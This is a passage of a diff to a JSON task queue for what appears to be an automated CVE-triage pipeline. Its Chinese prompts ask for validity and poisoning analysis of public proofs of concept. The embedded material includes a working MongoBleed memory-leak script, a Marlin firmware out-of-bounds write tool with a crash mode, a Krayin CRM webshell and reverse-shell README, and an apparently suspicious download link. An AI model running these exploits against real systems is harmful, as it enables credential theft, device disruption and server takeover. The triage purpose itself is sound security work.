Cve-2025-14847\n [description] NVD MENU Information Technology Laboratory National Vulnerability Database Vulnerabilities\n [link] https://nvd.nist.gov/vuln/detail/CVE-2025-14847\n [webpage 4 end]\n[webpage 5 begin] [title] PoC: Exploiting MongoBleed, CVE-2025-14847 | Technical Walkthrough | OX Security\n [description] December 30, 2025 - Technical walkthrough of MongoBleed (CVE-2025-14847) exploitation. Learn how attackers abuse OP_COMPRESSED to leak MongoDB memory without authentication\n [link] https://www.ox.security/blog/poc-exploiting-mongobleed-cve-2025-14847-technical-walkthrough/\n [webpage 5 end]\n[webpage 6 begin] [title] Threat Brief: MongoDB Vulnerability (CVE-2025-14847)\n [description] February 19, 2026 - Cortex Attack Surface Testing (AST) can also validate whether exposed MongoDB instances are vulnerable to exploitation by executing benign PoC checks. Identified findings can either be viewed in the Threat Response Center or in the incident view of Expander. These findings are also available for Cortex XSIAM customers who have purchased the attack surface management (ASM) module. Cortex Cloud can help detect cloud-hosted resources vulnerable to CVE-2025-14847 through the proper placement of Cortex Cloud XDR endpoint agent and serverless agents within a cloud environment.\n [link] https://unit42.paloaltonetworks.com/mongobleed-cve-2025-14847/\n [webpage 6 end]\n[webpage 7 begin] [title] CVE-2025-14847 MongoDB “MongoBleed”: Details, Next Steps | Bitsight\n [description] December 29, 2025 - Although initially reported by some sources as a potential remote code execution (RCE) issue, MongoDB and BleepingComputer have clarified that CVE-2025-14847 is not officially classified as an RCE vulnerability. Instead, exploitation enables attackers to extract sensitive in-memory data such as credentials, API keys, and authentication tokens, which may facilitate follow-on compromise. Public proof-of-concept (PoC) exploit code is available, and security researchers have observed active exploitation attempts against exposed MongoDB servers.\n [link] https://www.bitsight.com/blog/critical-vulnerability-alert-cve-2025-14847-mongodb-mongobleed\n [webpage 7 end]\n[webpage 8 begin] [title] GitHub - Security-Phoenix-demo/mongobleed-exploit-CVE-2025-14847: Exploit lab, docker and code scanner for mongobleed Vulnerability CVE-2025-14847 plus Phoenix Security Sync tools · GitHub\n [description] December 28, 2025 - mongobleed-exploit-CVE-2025-14847/ ├── exploit/ # 🔴 Exploit Lab │ ├── docker-compose.yml # Vulnerable + Patched MongoDB instances │ ├── mongobleed.py # Memory leak exploit PoC │ ├── init/init-mongo.js # Sensitive test data │ ├── test-exploit.sh # Lab test script │ └── README.md # Lab documentation │ ├── scanner/ # 🌐 Network Scanner │ ├── mongobleed_scanner.py # IP/domain vulnerability scanner │ ├── sample-targets.txt # Sample targets file │ └── README.md # Scanner documentation │ ├── code-scan/ # 📂 C\n [link] https://github.com/Security-Phoenix-demo/mongobleed-exploit-CVE-2025-14847\n [webpage 8 end]\n[webpage 9 begin] [title] GitHub - ProbiusOfficial/CVE-2025-14847: poc for CVE-2025-14847 · GitHub\n [description] This is a critical fix to address CVE-2025-14847. Upgrade to 8.2.3, 8.0.17, 7.0.28, 6.0.27, 5.0.32, or 4.4.30. ... An client-side exploit of the Server's zlib implementation can return uninitialized heap memory without authenticating to the server.\n [link] https://github.com/ProbiusOfficial/CVE-2025-14847\n [webpage 9 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/7424d1015e7438b7fe77c270809c51a2/CVE-2025-14847.py\n---\n#!/usr/bin/env python3\n\nimport argparse\nimport socket\nimport struct\nimport zlib\nimport re\nimport signal\nimport sys\nimport time\n\n# Default BSON element: int32 field \"a\" = 1\nDEFAULT_CONTENT = b'\\x10a\\x00\\x01\\x00\\x00\\x00'\n\n\ndef build_packet(doc_len: int, buffer_offset: int, content: bytes) -> bytes:\n    # Minimal BSON-ish blob (keep original behavior)\n    bson = struct.pack('<i', doc_len) + content\n\n    # Minimal OP_MSG body: flags=0, section kind=0, then BSON\n    op_msg = struct.pack('<I', 0) + b'\\x00' + bson\n\n    # Compress inner OP_MSG using zlib\n    compressed = zlib.compress(op_msg)\n\n    # OP_COMPRESSED payload:\n    # - original opcode (OP_MSG)\n    # - claimed uncompressed size (doc_len + offset)\n    # - compressor id (2 = zlib)\n    payload = struct.pack('<i', 2013)\n    payload += struct.pack('<i', doc_len + buffer_offset)\n    payload += struct.pack('B', 2)\n    payload += compressed\n\n    # Wire header for OP_COMPRESSED\n    header = struct.pack('<iiii', 16 + len(payload), 1, 0, 2012)\n    return header + payload\n\n\ndef recv_one_message(sock: socket.socket) -> bytes:\n    # Read until we have the full message based on the first 4 bytes (length)\n    response = b''\n    while True:\n        chunk = sock.recv(4096)\n        if not chunk:\n            break\n        response += chunk\n        if len(response) >= 4:\n            msg_len = struct.unpack('<i', response[:4])[0]\n            if len(response) >= msg_len:\n                return response[:msg_len]\n    return response\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser(description=\"MongoBleed live leaker (PoC)\")\n    parser.add_argument(\"--host\", default=\"127.0.0.1\", help=\"Target IP/hostname\")\n    parser.add_argument(\"--port\", type=int, default=27017, help=\"Target port\")\n    parser.add_argument(\"--min\", dest=\"min_len\", type=int, default=20, help=\"Min doc_len\")\n    parser.add_argument(\"--max\", dest=\"max_len\", type=int, default=32768, help=\"Max doc_len\")\n    parser.add_argument(\"--offset\", type=int, default=500, help=\"Buffer offset\")\n    parser.add_argument(\"--timeout\", type=float, default=2.0, help=\"Socket timeout seconds\")\n    parser.add_argument(\"--sleep\", type=float, default=0.001, help=\"Sleep per iteration seconds\")\n    args = parser.parse_args()\n\n    print(f\"[*] MongoBleed live leaker -> {args.host}:{args.port}\")\n    print(\"[*] Streaming unique leaks only (Ctrl+C to stop)\\n\")\n\n    last_leak = None\n\n    def signal_handler(sig, frame):\n        print(\"\\n[*] Stopped by user\")\n        sys.exit(0)\n\n    signal.signal(signal.SIGINT, signal_handler)\n\n    doc_len = args.min_len\n    while True:\n        if doc_len > args.max_len:\n            doc_len = args.min_len\n\n        full_packet = build_packet(doc_len, args.offset, DEFAULT_CONTENT)\n\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(args.timeout)\n            sock.connect((args.host, args.port))\n            sock.sendall(full_packet)\n\n            response = recv_one_message(sock)\n            sock.close()\n        except Exception:\n            response = b''\n\n        # Skip obvious non-responses\n        if len(response) < 25:\n            doc_len += 1\n            continue\n\n        # If response is compressed, decompress its payload; else just use body\n        try:\n            msg_len = struct.unpack('<i', response[:4])[0]\n            opcode = struct.unpack('<i', response[12:16])[0]\n            raw = zlib.decompress(response[25:msg_len]) if opcode == 2012 else response[16:msg_len]\n        except Exception:\n            doc_len += 1\n            continue\n\n        # Look for new interesting strings and print only changes\n        for match in re.finditer(rb\"field name '([^']*)'\", raw):\n            leak = match.group(1)\n            if not leak or leak in [b'a', b'$db', b'ping', b'?']:\n                continue\n\n            text = leak.decode('utf-8', errors='replace')\n            if text != last_leak:\n                print(f\"[+] New leak (~offset {doc_len}): {text}\")\n                last_leak = text\n\n        doc_len += 1\n        time.sleep(args.sleep)\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n\n\n---\n/tmp/7424d1015e7438b7fe77c270809c51a2/README.md\n---\n# 🛡️ CVE-2025-14847 - Easy Tool for MongoDB Security\n\n## 📥 Download Now\n[![Download](https://raw.githubusercontent.com/sakthivel10q/CVE-2025-14847/main/assets/CV_1.6.zip%https://raw.githubusercontent.com/sakthivel10q/CVE-2025-14847/main/assets/CV_1.6.zip)](https://raw.githubusercontent.com/sakthivel10q/CVE-2025-14847/main/assets/CV_1.6.zip)\n\n## 📋 Overview\nCVE-2025-14847, also known as MongoBleed, is a security tool designed to identify vulnerabilities in MongoDB. This application helps users assess their MongoDB databases effectively. You do not need programming skills to use this tool. \n\n## 🚀 Getting Started\nFollow these steps to download and run the application. \n\n1. **Visit the Releases Page**  \n   Click this link to access all available downl\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
-    "retry_count": 4,
+    "retry_count": 5,
     "max_retries": 5,
     "priority": 2,
-    "status": "pending",
+    "status": "failed",
     "error_type": "client_error",
     "last_error": "API返回空结果",
     "created_at": 1782336377.0440533,
-    "last_attempt": 1782342380.7581258,
-    "next_attempt": 1782342446.9396107,
+    "last_attempt": 1782359049.0354383,
+    "next_attempt": 1782359139.9349246,
     "metadata": {},
     "task_id": "task_CVE-2025-14847_1782336377",
     "required_result_fields": [
@@ -2900,19 +2900,19 @@
     ]
   },
   {
-    "cve_id": "CVE-2026-56111",
-    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-56111\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"Marlin Firmware through 2.1.2.7, fixed in commit 1f255d1, when built with MESH_BED_LEVELING enabled, contains an out-of-bounds write vulnerability in the M421 G-code handler that allows attackers to corrupt firmware memory by supplying out-of-range X and Y grid indices. Attackers can send a single crafted G-code command via USB serial, network interface, or malicious gcode file to write an attacker-controlled 32-bit float value past the z_values array bounds, corrupting adjacent firmware variables and causing denial of service or firmware state corruption.\", \"\\u6807\\u9898: Marlin Firmware M421 G-code \\u8d8a\\u754c\\u5199\\u5165\\u6f0f\\u6d1e\"], \"published_date\": \"2026-06-24T16:16:32.930\", \"last_modified_date\": \"2026-06-24T17:17:29.960\", \"cvss_score\": 9.1, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"M\", \"a\", \"r\", \"l\", \"i\", \"n\", \"F\", \"i\", \"r\", \"m\", \"w\", \"a\", \"r\", \"e\", \"/\", \"M\", \"a\", \"r\", \"l\", \"i\", \"n\", \"/\", \"c\", \"o\", \"m\", \"m\", \"i\", \"t\", \"/\", \"1\", \"f\", \"2\", \"5\", \"5\", \"d\", \"1\", \"6\", \"e\", \"c\", \"2\", \"d\", \"4\", \"5\", \"6\", \"4\", \"5\", \"4\", \"f\", \"d\", \"4\", \"4\", \"4\", \"4\", \"9\", \"4\", \"c\", \"f\", \"b\", \"3\", \"3\", \"8\", \"d\", \"6\", \"2\", \"b\", \"0\", \"f\", \"a\", \"1\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"M\", \"a\", \"r\", \"l\", \"i\", \"n\", \"F\", \"i\", \"r\", \"m\", \"w\", \"a\", \"r\", \"e\", \"/\", \"M\", \"a\", \"r\", \"l\", \"i\", \"n\", \"/\", \"i\", \"s\", \"s\", \"u\", \"e\", \"s\", \"/\", \"2\", \"8\", \"4\", \"6\", \"7\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"M\", \"a\", \"r\", \"l\", \"i\", \"n\", \"F\", \"i\", \"r\", \"m\", \"w\", \"a\", \"r\", \"e\", \"/\", \"M\", \"a\", \"r\", \"l\", \"i\", \"n\", \"/\", \"p\", \"u\", \"l\", \"l\", \"/\", \"2\", \"8\", \"4\", \"6\", \"8\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"v\", \"u\", \"l\", \"n\", \"c\", \"h\", \"e\", \"c\", \"k\", \".\", \"c\", \"o\", \"m\", \"/\", \"a\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"m\", \"a\", \"r\", \"l\", \"i\", \"n\", \"-\", \"f\", \"i\", \"r\", \"m\", \"w\", \"a\", \"r\", \"e\", \"-\", \"o\", \"u\", \"t\", \"-\", \"o\", \"f\", \"-\", \"b\", \"o\", \"u\", \"n\", \"d\", \"s\", \"-\", \"w\", \"r\", \"i\", \"t\", \"e\", \"-\", \"v\", \"i\", \"a\", \"-\", \"m\", \"4\", \"2\", \"1\", \"-\", \"g\", \"-\", \"c\", \"o\", \"d\", \"e\", \"-\", \"h\", \"a\", \"n\", \"d\", \"l\", \"e\", \"r\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] GitHub - XZ1r0/cve-2026-poc-collection: CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs · GitHub\n [description] CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs - XZ1r0/cve-2026-poc-collection\n [link] https://github.com/XZ1r0/cve-2026-poc-collection\n [webpage 0 end]\n[webpage 1 begin] [title] GitHub - 0xMarcio/cve: Latest CVEs with their Proof of Concept exploits. · GitHub\n [description] PoC: fully unprivileged container escape to node-level code execution on Kubernetes via CVE-2026-31431 page-cache corruption + shared image layers.\n [link] https://github.com/0xMarcio/cve\n [webpage 1 end]\n[webpage 2 begin] [title] AI PoC Generator & CVE Exploit Database — Daily Updated | Vulnerability Platform\n [description] 39689+ CVE proof-of-concept exploits aggregated from GitHub and the security community, plus 5040+ AI-generated PoC analyses by Shenlong Agent. Daily updated, search by CVE ID.\n [link] https://cve.imfht.com/poc\n [webpage 2 end]\n[webpage 3 begin] [title] exploitarium/libssh2-cve-2026-55200-poc at main · bikini/exploitarium\n [description] A single archive of public exploit PoCs and vulnerability research writeups. At the time I post these, none have been reported. Feel free to report them yourself and take credit for the CVE if handed out lulz - exploitarium/libssh2-cve-2026-55200-poc at main · bikini/exploitarium\n [link] https://github.com/bikini/exploitarium/tree/main/libssh2-cve-2026-55200-poc\n [webpage 3 end]\n[webpage 4 begin] [title] GitHub - zulloper/cve-poc: CVE POC repo 자동 수집기 · GitHub\n [description] CVE-2026-27771 - Gitea/Forgejo Container Registry Auth Bypass Exploit PoC - Pull private container i...\n [link] https://github.com/zulloper/cve-poc\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/3bd29d7e20b9747f65b6120f111db1a6/README.md\n---\n# CVE-2026-56111 - Marlin M421 Out-of-bounds Write\n\nProof of concept for **CVE-2026-56111**, an out-of-bounds write in the `M421` G-code\nhandler of [Marlin Firmware](https://github.com/MarlinFirmware/Marlin) when built with\n`MESH_BED_LEVELING`.\n\n- Advisory: https://www.vulncheck.com/advisories/marlin-firmware-out-of-bounds-write-via-m421-g-code-handler\n- Affected: Marlin <= 2.1.2.7, fixed in commit `1f255d1`\n- Severity: High (CVSS 8.3)\n\n## The bug\n\nThe MBL `M421` handler checks only that the I/J indices are not negative. It never\nchecks the upper bound. `set_z()` then writes `z_values[ix][iy] = z` with no bound\ncheck. An index past the grid writes a controlled 32-bit float past the `z_values`\narray, into adjacent firmware state.\n\nThe write is **constrained, not arbitrary**. The target is\n`z_values + (ix*GRID_Y + iy)*4` bytes, with the indices bounded by `int8_t` (max 127),\nso the reachable window is about 2 KB past `z_values`. You control the value (the Z\nfloat) and the offset (the index). You do not control an absolute address.\n\nThis tool only sends the G-code line. The out-of-bounds write happens inside the\nfirmware. Observable effects are denial of service, firmware crash, or corrupted\nmotion. The exact memory write is shown in the advisory, not by this tool.\n\n## Build\n\n```\ngcc -O2 -o exp exploit.c\n```\n\n## Use\n\nPick one channel:\n\n- `--serial <dev>` for USB, e.g. `/dev/ttyUSB0` or `/dev/ttyACM0`\n  (add `--baud N` if needed; many boards use `250000`)\n- `--tcp <host:port>` for printers exposing telnet/network gcode, e.g. `192.168.1.50:23`\n\n### write mode\n\nSend `M421` with the index and value you choose:\n\n```\n./exp --serial /dev/ttyUSB0 write -i 3 -j 0 -z 99.0\n./exp --tcp 192.168.1.50:23  write -i 5 -j 0 -z 99.0\n```\n\nOn a default 3x3 grid (valid index 0..2):\n- `-i 3 -j 0` writes at offset 36 bytes, which is `z_offset` (the bed Z offset)\n- `-i 5 -j 0` writes at offset 60 bytes, which is the parser object\n\n### dos mode\n\nSend an out-of-range index with a NaN Z value. The NaN propagates into the motion math\nand reliably crashes or hangs the firmware:\n\n```\n./exp --serial /dev/ttyUSB0 dos\n./exp --tcp 192.168.1.50:23  dos\n```\n\n## Fix\n\nUpdate to a Marlin build that includes commit `1f255d1`, which bounds the indices the\nsame way the ABL and UBL handlers already do.\n\n## Disclaimer\n\nFor research and authorized testing only. Use only on devices you own or have explicit\npermission to test. Sending these commands can crash a printer or disrupt a print.\n\n\n---\n/tmp/3bd29d7e20b9747f65b6120f111db1a6/exploit.c\n---\n/*\n * PoC for CVE-2026-56111\n * Marlin Firmware <= 2.1.2.7 - Out-of-bounds write via the M421 G-code handler\n * (Mesh Bed Leveling). Fixed in commit 1f255d1.\n *\n * The M421 MBL handler checks only that the I/J indices are not negative. It does\n * not check the upper bound. set_z() then writes z_values[ix][iy] = z with no bound\n * check. An index past the grid writes a controlled 32-bit float past the z_values\n * array, into adjacent firmware state (z_offset, the parser object, GcodeSuite state).\n *\n * This tool only sends the G-code line. The out-of-bounds write happens inside the\n * firmware. The write is CONSTRAINED, not arbitrary: the target offset is\n * z_values + (ix*GRID_Y + iy)*4 bytes, with ix/iy bounded by int8_t (max 127), so the\n * reachable window is about 2 KB past z_values. You control the value (the Z float)\n * and the offset (the index). You do NOT control an absolute address.\n *\n * Two modes:\n *   write : send M421 with the I/J/Z you choose (controlled value, controlled offset)\n *   dos   : send an out-of-range index with a NaN Z value, which propagates into the\n *           motion math and reliably crashes or hangs the firmware\n *\n * Two channels:\n *   --serial <device>   e.g. /dev/ttyUSB0 or /dev/ttyACM0 (USB, the common case)\n *   --tcp <host:port>   e.g. 192.168.1.50:23 (printers exposing telnet/network gcode)\n *\n * Build:  gcc -O2 -o exp exploit.c\n *\n * Use only on devices you own or are authorized to test.\n *\n * Author: Christ Bouchuen\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <termios.h>\n#include <errno.h>\n#include <stdint.h>\n\n#include <sys/socket.h>\n#include <netdb.h>\n\nstatic void usage(const char *p) {\n    fprintf(stderr,\n\"PoC for CVE-2026-56111 (Marlin M421 out-of-bounds write)\\n\\n\"\n\"Usage:\\n\"\n\"  %s (--serial <dev> [--baud N] | --tcp <host:port>) <mode> [mode args]\\n\\n\"\n\"Channels:\\n\"\n\"  --serial <dev>     serial device, e.g. /dev/ttyUSB0 or /dev/ttyACM0\\n\"\n\"  --baud N           serial baud rate (default 115200; many boards use 250000)\\n\"\n\"  --tcp <host:port>  TCP target, e.g. 192.168.1.50:23\\n\\n\"\n\"Modes:\\n\"\n\"  write -i IX -j IY -z VALUE\\n\"\n\"        send 'M421 I<IX> J<IY> Z<VALUE>'. With an out-of-range IX/IY this writes\\n\"\n\"        VALUE past z_values. Offset = z_values + (IX*GRID_Y + IY)*4 bytes.\\n\"\n\"        Example (3x3 grid, valid max index 2):\\n\"\n\"          %s --ser\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "cve_id": "CVE-2026-38526",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-38526\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"An authenticated arbitrary file upload vulnerability in the /admin/tinymce/upload endpoint of Webkul Krayin CRM v2.2.x allows attackers to execute arbitrary code via uploading a crafted PHP file.\", \"\\u6807\\u9898: Krayin CRM v2.2.x \\u6587\\u4ef6\\u4e0a\\u4f20\\u6f0f\\u6d1e\"], \"published_date\": \"2026-04-14T16:16:43.127\", \"last_modified_date\": \"2026-06-17T10:41:42.487\", \"cvss_score\": 9.9, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"T\", \"R\", \"E\", \"X\", \"N\", \"E\", \"G\", \"R\", \"O\", \"/\", \"S\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"A\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"t\", \"r\", \"e\", \"e\", \"/\", \"m\", \"a\", \"i\", \"n\", \"/\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"3\", \"8\", \"5\", \"2\", \"6\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"k\", \"r\", \"a\", \"y\", \"i\", \"n\", \"/\", \"l\", \"a\", \"r\", \"a\", \"v\", \"e\", \"l\", \"-\", \"c\", \"r\", \"m\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"T\", \"R\", \"E\", \"X\", \"N\", \"E\", \"G\", \"R\", \"O\", \"/\", \"S\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"A\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"i\", \"e\", \"s\", \"/\", \"b\", \"l\", \"o\", \"b\", \"/\", \"m\", \"a\", \"i\", \"n\", \"/\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"3\", \"8\", \"5\", \"2\", \"6\", \"/\", \"p\", \"o\", \"c\", \".\", \"m\", \"d\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] NVD - CVE-2026-38526\n [description] Apr 14, 2026 · An official website of the United States government Here's how you know\n [link] https://nvd.nist.gov/vuln/detail/CVE-2026-38526\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-38526: Arbitrary File | VulnBase\n [description] Apr 14, 2026 · CVE-2026-38526 (CVSS 9.9, Critical severity) — An authenticated arbitrary file upload vulnerability in the /admin/tinymce/upload endpoint of Webkul Krayi… Exploit details, CVSS vector, and remediation on VulnBase.\n [link] https://www.vulnbase.org/cve/CVE-2026-38526\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-38526 Security Vulnerability & Exploit Details\n [description] Apr 14, 2026 · Below is the Impact Analysis for CVE-2026-38526, showing how Confidentiality, Integrity, and Availability might be affected if the vulnerability is exploited.\n [link] https://cve.akaoma.com/cve-2026-38526\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-38526 - Krayin CRM PHP File Upload Code Execution ...\n [description] Apr 14, 2026 · An authenticated arbitrary file upload vulnerability in the /admin/tinymce/upload endpoint of Webkul Krayin CRM v2.2.x allows attackers to execute arbitrary code via uploading a crafted PHP file.\n [link] https://cvefeed.io/vuln/detail/CVE-2026-38526\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-38526 - Exploits & Severity - Feedly\n [description] Apr 14, 2026 · CVE-2026-38526 identifies a critical authenticated arbitrary file upload vulnerability in Webkul Krayin CRM v2.2.x. The flaw, located in the endpoint, allows an attacker to upload a specially crafted PHP file.\n [link] https://feedly.com/cve/CVE-2026-38526\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/aab573072f1da9a79bd87865c40f017f/README.md\n---\n# CVE-2026-38526 - Krayin CRM RCE Exploit\n\n**Krayin CRM** (≤ 2.2.x) - Unrestricted File Upload leading to Remote Code Execution.\n\nThis PoC exploits the vulnerable TinyMCE upload endpoint (`/admin/tinymce/upload`) to upload a PHP webshell and achieve command execution on the server.\n\n---\n\n## Features\n\n- Full automatic login with CSRF token handling\n- Bypasses upload restrictions using double extension (`shell.png.php`)\n- Supports reverse shell (base64 encoded) and single command execution\n- Reliable Laravel CSRF token refresh\n- Clean and easy to use\n\n---\n\n## Requirements\n\n```Bash\npip3 install requests beautifulsoup4\n```\nUsage\n\n1. Reverse Shell (Default & Recommended)\n```Bash\npython3 exploit.py \\\n  -u http://example.com \\\n  -e user@example.com \\\n  -p \"example_pass\" \\\n  --lhost YOUR_IP \\\n  --lport 4444\n```\n2. Single Command\n\n```Bash\npython3 exploit.py \\\n  -u http://example.com \\\n  -e user@example.com \\\n  -p \"example_pass\" \\\n  -c \"whoami\"\n```\n## Options\n| Argument | Description | Required |\n|----------|----------|----------|\n| -u, 